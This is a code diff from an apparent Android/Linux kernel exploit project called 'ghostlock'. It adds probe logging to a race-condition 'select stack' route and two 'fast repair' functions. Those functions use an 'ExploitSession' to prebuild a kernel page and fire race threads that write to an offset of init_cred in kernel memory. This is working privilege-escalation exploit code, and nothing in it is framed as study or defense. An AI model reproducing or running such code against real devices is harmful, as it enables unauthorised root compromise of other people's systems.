@@ -1,4 +1,4 @@
-#include "route/select_stack_route.h"
+﻿#include "route/select_stack_route.h"
 
 #include <unistd.h>
 
@@ -149,6 +149,8 @@ namespace ghostlock::route::select_stack {
 
 #include "route/route_lifecycle.hpp"
 #include "route/select_stack_route.h"
+#include "route/route_policy.hpp"
+#include "race/threads.hpp"
 #include "route/tcp_zerocopy_route.h"
 
 using namespace ghostlock;
@@ -413,6 +415,8 @@ namespace ghostlock::route::select_stack {
     route::RouteStatus SelectStackRoute::execute() noexcept {
         struct timespec route_t0;
         clock_gettime(CLOCK_MONOTONIC, &route_t0);
+        pr_info("[probe] select route race=%p go=%d\n", static_cast<void *>(race),
+                race ? race->consumer_go.load() : -1);
 
         /* Compact retries rebuild the payload page between attempts (U01/SELECT-01,
      * mirroring upstream 50d2b72): a lost race clobbers the page, so every
@@ -519,7 +523,45 @@ namespace ghostlock::route {
                 context.status.error_number);
         return status;
     }
+    bool SelectPolicy::w2_fast_repair_prebuild(
+        session::ExploitSession &exploit_session) noexcept {
+        const memory::WriteRequest repair_request = memory::WriteRequest::make(
+            exploit_session.addresses.data_alias(
+                exploit_session.addresses.init_cred_image_addr()) + 8,
+            memory::WriteMode::Zero, 1);
+        (exploit_session.heap.current.base) =
+                support::prepare_good_kernel_page(repair_request);
+        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
+            pr_warning("W2 fast repair prebuild failed\n");
+            support::discard_prebuilt_page();
+            return false;
+        }
+        pr_info("W2 fast repair payload prebuilt (select)\n");
+        return true;
+    }
+
+    bool SelectPolicy::w2_fast_repair_activate(
+        session::ExploitSession &exploit_session) noexcept {
+        if (!support::activate_prebuilt_page()) {
+            pr_warning("W2 fast repair activation failed\n");
+            return false;
+        }
+        const memory::WriteRequest repair_request = memory::WriteRequest::make(
+            exploit_session.addresses.data_alias(
+                exploit_session.addresses.init_cred_image_addr()) + 8,
+            memory::WriteMode::Zero, 1);
+        pr_info("W2b: firing prebuilt init_cred+8 repair (select)\n");
+        exploit_session.race.fast_repair.store(1);
+        const Status repaired = race::run_main_route_threads(repair_request);
+        exploit_session.race.fast_repair.store(0);
+        if (!repaired) {
+            pr_warning("W2 fast repair route failed\n");
+            return false;
+        }
+        return true;
+    }
 } // namespace ghostlock::route
+
 #endif // __ANDROID__
 
 
